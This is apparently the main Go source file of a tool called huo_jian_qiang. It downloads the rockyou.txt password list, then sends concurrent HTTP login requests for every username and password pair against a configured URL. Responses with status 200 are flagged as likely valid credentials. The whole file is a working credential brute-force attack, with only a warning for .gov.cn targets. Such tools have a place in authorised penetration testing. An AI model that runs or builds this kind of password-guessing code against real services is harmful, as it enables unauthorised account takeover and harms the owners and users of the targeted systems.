package main

import (
	"bufio"
	"fmt"
	"huo_jian_qiang/cmd"
	"huo_jian_qiang/internal/download"
	"huo_jian_qiang/internal/logger"
	"huo_jian_qiang/internal/warning"
	"os"
	"strings"
	"sync"
	"time"

	http "huo_jian_qiang/internal/http"
)

func main() {
	cfg, err := cmd.ReadConfig()
	if err != nil {
		logger.Errorf("读取配置失败: %v", err)
		return
	}

	downloader := download.PasswordDownloader("downloads")

	if _, err := downloader.DownloadFile("https://github.com/ctkqiang/ZhiMing/releases/download/rockyou.txt/rockyou.txt"); err != nil {
		logger.Errorf("下载密码文件失败: %v", err)
		return
	}

	if err := download.CreateUsersTxt("."); err != nil {
		logger.Errorf("创建用户文件失败: %v", err)
		return
	}

	logger.Infof("-> 开始处理...")

	if strings.Contains(cfg.Url, ".gov.cn") {
		warningMsg, err := warning.DisplayWarning(cfg.Url)

		if err != nil {
			logger.Errorf("%s", warningMsg)
			os.Exit(0)
		}
	}

	if err := processFiles(cfg); err != nil {

		if strings.Contains(err.Error(), "no such file or directory") {
			logger.Errorf("用户文件不存在")
			return
		}

		logger.Errorf("处理文件失败: %v", err)

		return
	}
}

// processFiles 是核心的凭证测试处理函数
// 该函数读取用户列表和密码字典文件，并使用并发控制机制执行HTTP请求测试
//
// 参数：
//
//	cfg *cmd.Config - 应用程序配置对象，包含线程数、文件路径、请求参数等配置信息
//
// 返回值：
//
//	error - 如果处理过程中发生错误则返回错误信息，否则返回nil
//
// 函数执行流程：
//  1. 调用readLines函数读取用户列表文件
//  2. 调用readLines函数读取密码字典文件
//  3. 创建sync.WaitGroup用于并发控制
//  4. 创建带缓冲的通道作为信号量，限制最大并发数（由cfg.Threads控制）
//  5. 使用双层循环遍历所有用户和密码组合
//  6. 为每个组合启动一个goroutine执行processRequest函数
//  7. 每个goroutine使用信号量控制并发，支持可配置的延迟(cfg.Delay)
//  8. 等待所有goroutine执行完成
//
// 并发控制机制：
//   - 使用sync.WaitGroup等待所有goroutine完成
//   - 使用带缓冲通道作为计数信号量，限制最大并发数
//   - 每个goroutine在启动前向信号量通道发送值，完成后接收值
//
// 异常情况：
//   - 用户文件读取失败：返回格式化错误信息
//   - 密码文件读取失败：返回格式化错误信息
//   - 并发执行过程中单个请求失败不影响其他请求，错误由processRequest函数内部处理
func processFiles(cfg *cmd.Config) error {
	users, err := readLines(cfg.UsersFile)
	if err != nil {
		return fmt.Errorf("读取用户文件失败: %v", err)
	}

	passwords, err := readLines(cfg.PasswordsFile)
	if err != nil {
		return fmt.Errorf("读取密码文件失败: %v", err)
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, cfg.Threads)

	for _, user := range users {
		for _, password := range passwords {
			wg.Add(1)
			semaphore <- struct{}{}

			go func(u, p string) {
				defer wg.Done()
				defer func() { <-semaphore }()

				if cfg.Delay > 0 {
					time.Sleep(time.Duration(cfg.Delay) * time.Second)
				}

				processRequest(cfg, u, p)
			}(user, password)
		}
	}

	wg.Wait()
	return nil
}

// readLines 是通用的文本文件行读取工具函数
// 该函数读取指定文件的所有行，并以字符串切片的形式返回
//
// 参数：
//
//	filename string - 要读取的文件路径
//
// 返回值：
//
//	[]string - 文件中的所有行组成的字符串切片，每行作为一个元素
//	error - 如果文件打开或读取失败则返回错误信息，否则返回nil
//
// 函数执行流程：
//  1. 使用os.Open打开指定文件
//  2. 使用defer确保文件正确关闭
//  3. 创建bufio.Scanner逐行扫描文件内容
//  4. 将每行文本添加到字符串切片中
//  5. 返回结果切片和扫描过程中可能出现的错误
//
// 技术细节：
//   - 使用bufio.Scanner进行高效的行读取，自动处理不同平台的换行符
//   - 每行文本通过scanner.Text()获取，不包含行尾换行符
//   - 文件大小受内存限制，超大文件可能导致内存不足
//   - 支持空文件，返回空的字符串切片
//
// 异常情况：
//   - 文件不存在或无权限访问：返回os.Open产生的错误
//   - 文件读取过程中出现I/O错误：返回scanner.Err()错误
//
// 注意：该函数不处理文件编码问题，假定文件使用UTF-8或兼容编码
func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// processRequest 是单个HTTP请求的处理函数
// 该函数构造HTTP请求并发送，处理响应结果并记录日志
//
// 参数：
//
//	cfg *cmd.Config - 应用程序配置对象，包含URL、请求方法、请求体模板等
//	user string - 当前测试的用户名
//	password string - 当前测试的密码
//
// 返回值：
//
//	无 - 该函数不返回值，所有结果通过logger输出
//
// 函数执行流程：
//  1. 从配置中获取请求体模板，替换{user}和{pass}占位符为实际值
//  2. 根据配置的请求方法（POST或GET）调用相应的HTTP请求函数
//  3. 处理HTTP响应，记录状态码和响应内容
//  4. 对状态码200的响应进行特殊高亮标记
//
// 请求构造：
//   - 使用strings.ReplaceAll替换请求体模板中的占位符
//   - 支持POST和GET两种HTTP方法
//   - 请求超时时间固定为30秒
//   - 请求体模板中的{user}和{pass}会被替换为实际值
//
// 响应处理：
//   - 状态码200：使用logger.Highlightf高亮输出，标记可能为有效凭据
//   - 其他状态码：使用logger.Infof普通输出
//   - 响应长度：记录响应内容的字节长度
//   - 错误处理：记录请求过程中发生的错误
//
// 异常情况：
//   - 不支持的HTTP方法：记录错误日志并立即返回
//   - HTTP请求失败：记录错误日志并返回
//   - 响应处理过程中不会抛出panic，所有错误被安全捕获和处理
//
// 注意：该函数运行在独立的goroutine中，需要确保线程安全的数据访问
func processRequest(cfg *cmd.Config, user, password string) {
	requestBody := cfg.RequestBody
	requestBody = strings.ReplaceAll(requestBody, "{user}", user)
	requestBody = strings.ReplaceAll(requestBody, "{pass}", password)

	var response string
	var statusCode int
	var err error

	switch strings.ToUpper(cfg.Method) {
	case "POST":
		response, statusCode, err = http.PostRequest(cfg.Url, requestBody, 30)
	case "GET":
		response, statusCode, err = http.GetRequest(cfg.Url, requestBody, 30)
	default:
		logger.Errorf("不支持的请求方法: %s", cfg.Method)
		return
	}

	if err != nil {
		logger.Errorf("-> 请求出错: %v", err)
		return
	}

	if statusCode == 200 {
		logger.Highlightf("[收到[%d]状态码 | %s | 响应长度=%d | %s]", statusCode, requestBody, len(response), "[这可能是凭据] ******** ")
	} else {
		logger.Infof("收到[%d]状态码 | %s | 响应长度=%d", statusCode, requestBody, len(response))
	}
}
